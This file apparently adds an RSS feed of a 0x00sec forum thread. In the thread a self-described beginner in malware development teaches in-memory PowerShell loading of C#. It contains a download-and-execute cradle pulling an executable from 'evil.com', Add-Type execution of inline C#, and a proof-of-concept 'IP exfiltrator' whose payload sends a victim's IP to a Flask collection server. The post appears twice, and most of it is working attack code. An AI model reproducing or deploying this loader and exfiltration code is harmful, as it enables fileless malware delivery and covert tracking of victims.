@@ -1,0 +1,289 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Powershell In-File Execution of C# Code</title>
+    <link>https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888</link>
+    <description># Introduction
+Some time ago I watched [John Hammond&#39;s video on this topic](https://www.youtube.com/watch?v=EwEwRLedeKI) and thought this would a be cool method to minify and showcase.
+#### Disclaimer: I am a beginner to malware development, C#, and Powershell, I would appreciate criticism. 
+
+# Explanation
+
+Firstly, we need to understand the most common way of loading C#, via an executable:
+
+* Fetch executable content and encapsulate in a byte array.
+
+* Load executable content using [System.Reflection.Assembly]::load() method.
+
+* Use Reflection to execute our loaded assembly.
+
+The code below follows these steps:
+
+```python
+$bytes = (Invoke-WebRequest &quot;https://evil.com/evilexe.exe&quot;).Content
+$loadedAssembly = [System.Reflection.Assembly]::Load($bytes)
+
+# Create entrypoint object and call it.
+
+$entry = 
+$loadedAssembly.GetType(&quot;NAMSPACE.CLASS_NAME&quot;).
+   GetMethod(&#39;STATIC_METHOD_NAME&#39;, [Reflection.BindingFlags] &#39;Static, Public, NonPublic&#39;)
+
+$entry.Invoke($null)
+```
+## C# Strings
+
+Instead of compiling and downloading an executable, why don&#39;t we just supply a multiline string with our desired C# code and &quot;load&quot; it like so:
+
+```python
+Add-Type @&quot;
+using System;
+ 
+public class Payload {
+ 
+    static void Execute() {
+        while (true) {
+            Console.WriteLine(&quot;wow :O&quot;);
+        }
+    }
+}
+ 
+&quot;@
+ 
+$pl = New-Object Payload
+ 
+$pl.Execute()
+```
+
+Now I know if you want to structure your code like a good programmer, with multiple files and DLLs, this looks a little bad. The big plus with this method is the fact you don&#39;t need to download or store executable byte-arrays in your script.
+
+# Proof of Concept: IP Exfiltrator/Logger
+
+As a simple proof of concept we will by building a basic IP logger, the script grabs the victims IP from https://ipinfo.io/ip and exfiltrates it to our evil URL. :smiling_imp: 
+
+## The Server
+
+The server I wrote is written using a Python micro-framework known as Flask, you can find the code below:
+
+```python
+from flask import Flask, request
+
+app = Flask(__name__)
+database = [] # Psuedo database 
+
+
+@app.route(&quot;/&quot;)
+def index():
+    ip = request.args.get(&quot;ip&quot;)
+    print(f&quot;[!] Grabbed IP: {ip}&quot;)
+    database.append(ip)
+
+    return &quot;status: 200&quot;
+
+# Driver code
+if __name__ == &quot;__main__&quot;:
+    app.run(port = 8080)
+```
+
+## The Payload
+In all honestly the payload could have been written better, requests could be handled through a single function instead of opening multiple HttpClient instances, but I have to remind myself this is just a PoC. The code is below:
+
+```python
+Add-Type @&quot;
+using System;
+using System.Net.Http; 
+
+public class Payload {
+        public static string HandleGrab() {
+                using (var client = new HttpClient()) {
+                        var ipEp = new Uri(&quot;https://ipinfo.io/ip&quot;);
+                        var res = client.GetAsync(ipEp).Result;
+
+                        return res.Content.ReadAsStringAsync().Result;
+                }
+        }
+ 
+        public static void Execute() {
+                using (var client = new HttpClient()) {
+                        var ipAddr = Payload.HandleGrab();
+
+                        // Exfiltration process
+                        var endpoint = new Uri($&quot;http://localhost:8080/?ip={ipAddr}&quot;);
+                        var res = client.GetAsync(endpoint).Result;
+                        var resJson = res.Content.ReadAsStringAsync().Result;
+
+                        Console.WriteLine(resJson);
+                }
+        }
+}
+&quot;@
+
+$pl = New-Object Payload
+
+$pl.Execute()
+```
+If everything runs smoothly you should get a log like so:
+![Server Screenshot](upload://GyzzsjQagJKAdRQpoMJpcheE39.png)
+
+# Fin
+
+Hopefully someone found this at least interesting. :slight_smile:</description>
+    
+    <lastBuildDate>Sat, 29 Oct 2022 19:25:38 +0000</lastBuildDate>
+    <category>Programming</category>
+    <atom:link href="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Powershell In-File Execution of C# Code</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888/3</link>
+        <pubDate>Mon, 27 Feb 2023 08:50:29 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-31888-3</guid>
+        <source url="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888.rss">Powershell In-File Execution of C# Code</source>
+      </item>
+      <item>
+        <title>Powershell In-File Execution of C# Code</title>
+        <dc:creator><![CDATA[tummybadger]]></dc:creator>
+        <description><![CDATA[
+            <p>This looks really interesting, thanks!</p>
+          <p><a href="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888/2</link>
+        <pubDate>Sat, 29 Oct 2022 19:25:38 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-31888-2</guid>
+        <source url="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888.rss">Powershell In-File Execution of C# Code</source>
+      </item>
+      <item>
+        <title>Powershell In-File Execution of C# Code</title>
+        <dc:creator><![CDATA[camel]]></dc:creator>
+        <description><![CDATA[
+            <h1>
+<a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
+<p>Some time ago I watched <a href="https://www.youtube.com/watch?v=EwEwRLedeKI" rel="noopener nofollow ugc">John Hammond’s video on this topic</a> and thought this would a be cool method to minify and showcase.</p>
+<h4>
+<a name="disclaimer-i-am-a-beginner-to-malware-development-c-and-powershell-i-would-appreciate-criticism-2" class="anchor" href="https://0x00sec.org#disclaimer-i-am-a-beginner-to-malware-development-c-and-powershell-i-would-appreciate-criticism-2"></a>Disclaimer: I am a beginner to malware development, C#, and Powershell, I would appreciate criticism.</h4>
+<h1>
+<a name="explanation-3" class="anchor" href="https://0x00sec.org#explanation-3"></a>Explanation</h1>
+<p>Firstly, we need to understand the most common way of loading C#, via an executable:</p>
+<ul>
+<li>
+<p>Fetch executable content and encapsulate in a byte array.</p>
+</li>
+<li>
+<p>Load executable content using [System.Reflection.Assembly]::load() method.</p>
+</li>
+<li>
+<p>Use Reflection to execute our loaded assembly.</p>
+</li>
+</ul>
+<p>The code below follows these steps:</p>
+<pre><code class="lang-python">$bytes = (Invoke-WebRequest "https://evil.com/evilexe.exe").Content
+$loadedAssembly = [System.Reflection.Assembly]::Load($bytes)
+
+# Create entrypoint object and call it.
+
+$entry = 
+$loadedAssembly.GetType("NAMSPACE.CLASS_NAME").
+   GetMethod('STATIC_METHOD_NAME', [Reflection.BindingFlags] 'Static, Public, NonPublic')
+
+$entry.Invoke($null)
+</code></pre>
+<h2>
+<a name="c-strings-4" class="anchor" href="https://0x00sec.org#c-strings-4"></a>C# Strings</h2>
+<p>Instead of compiling and downloading an executable, why don’t we just supply a multiline string with our desired C# code and “load” it like so:</p>
+<pre><code class="lang-python">Add-Type @"
+using System;
+ 
+public class Payload {
+ 
+    static void Execute() {
+        while (true) {
+            Console.WriteLine("wow :O");
+        }
+    }
+}
+ 
+"@
+ 
+$pl = New-Object Payload
+ 
+$pl.Execute()
+</code></pre>
+<p>Now I know if you want to structure your code like a good programmer, with multiple files and DLLs, this looks a little bad. The big plus with this method is the fact you don’t need to download or store executable byte-arrays in your script.</p>
+<h1>
+<a name="proof-of-concept-ip-exfiltratorlogger-5" class="anchor" href="https://0x00sec.org#proof-of-concept-ip-exfiltratorlogger-5"></a>Proof of Concept: IP Exfiltrator/Logger</h1>
+<p>As a simple proof of concept we will by building a basic IP logger, the script grabs the victims IP from <a href="https://ipinfo.io/ip" rel="noopener nofollow ugc">https://ipinfo.io/ip</a> and exfiltrates it to our evil URL. <img src="https://0x00sec.org/images/emoji/twitter/smiling_imp.png?v=12" title=":smiling_imp:" class="emoji" alt=":smiling_imp:" loading="lazy" width="20" height="20"></p>
+<h2>
+<a name="the-server-6" class="anchor" href="https://0x00sec.org#the-server-6"></a>The Server</h2>
+<p>The server I wrote is written using a Python micro-framework known as Flask, you can find the code below:</p>
+<pre><code class="lang-python">from flask import Flask, request
+
+app = Flask(__name__)
+database = [] # Psuedo database 
+
+
+@app.route("/")
+def index():
+    ip = request.args.get("ip")
+    print(f"[!] Grabbed IP: {ip}")
+    database.append(ip)
+
+    return "status: 200"
+
+# Driver code
+if __name__ == "__main__":
+    app.run(port = 8080)
+</code></pre>
+<h2>
+<a name="the-payload-7" class="anchor" href="https://0x00sec.org#the-payload-7"></a>The Payload</h2>
+<p>In all honestly the payload could have been written better, requests could be handled through a single function instead of opening multiple HttpClient instances, but I have to remind myself this is just a PoC. The code is below:</p>
+<pre><code class="lang-python">Add-Type @"
+using System;
+using System.Net.Http; 
+
+public class Payload {
+        public static string HandleGrab() {
+                using (var client = new HttpClient()) {
+                        var ipEp = new Uri("https://ipinfo.io/ip");
+                        var res = client.GetAsync(ipEp).Result;
+
+                        return res.Content.ReadAsStringAsync().Result;
+                }
+        }
+ 
+        public static void Execute() {
+                using (var client = new HttpClient()) {
+                        var ipAddr = Payload.HandleGrab();
+
+                        // Exfiltration process
+                        var endpoint = new Uri($"http://localhost:8080/?ip={ipAddr}");
+                        var res = client.GetAsync(endpoint).Result;
+                        var resJson = res.Content.ReadAsStringAsync().Result;
+
+                        Console.WriteLine(resJson);
+                }
+        }
+}
+"@
+
+$pl = New-Object Payload
+
+$pl.Execute()
+</code></pre>
+<p>If everything runs smoothly you should get a log like so:<br>
+<img src="https://0x00sec.s3.amazonaws.com/original/3X/0/4/04cf8b9bf487eb23d3553b4f571a65c5626f8e43.png" alt="Server Screenshot" data-base62-sha1="GyzzsjQagJKAdRQpoMJpcheE39" width="550" height="52"></p>
+<h1>
+<a name="fin-8" class="anchor" href="https://0x00sec.org#fin-8"></a>Fin</h1>
+<p>Hopefully someone found this at least interesting. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
+          <p><a href="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888/1</link>
+        <pubDate>Fri, 28 Oct 2022 16:50:18 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-31888-1</guid>
+        <source url="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888.rss">Powershell In-File Execution of C# Code</source>
+      </item>
+  </channel>
+</rss>
